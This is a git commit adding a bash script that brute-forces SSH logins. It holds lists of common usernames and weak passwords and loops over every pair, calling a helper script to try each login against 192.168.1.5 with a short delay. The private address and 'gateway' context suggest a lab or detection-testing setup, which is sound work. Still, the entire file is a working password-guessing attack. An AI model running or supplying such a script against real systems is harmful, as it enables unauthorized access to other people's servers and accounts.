e23e86bf7125724978c00acfcd7ced24f42f838e
tsorrels <tsorrels@github.com>
2018-11-04 22:00:30 -0500

    adding scripts for gateway

---
+++ Gateway/ssh_brute_force.bash
@@ -0,0 +1,45 @@
+declare -a users=("root"
+		"admin"
+		"admin1"
+		"administrator"
+		"administrator1"
+		"user"
+		"user1"
+		"anonymous"
+		"anonymous1"
+		"Admin"
+		"Admin1"
+		"Administrator"
+		"Administrator1"
+		"User"
+		"User1"
+		"Anonymous"
+		"Anonymous1"
+		)
+
+declare -a passwords=("password"
+			"password1"
+			"password123"
+			"pass123"
+			"Password"
+			"Password123"
+			"GoPackers"
+			"GoCowboys"
+			"GoSeahawks"
+			"admin"
+			"administrator"
+			"root"
+			"Admin"
+			)
+
+sleep 180
+
+for user in "${users[@]}"
+do
+	for password in "${passwords[@]}"
+	do
+		./ssh_pass_fail.bash "$password" ssh "$user"@192.168.1.5
+		# echo "$password"
+		sleep 6
+	done
+done
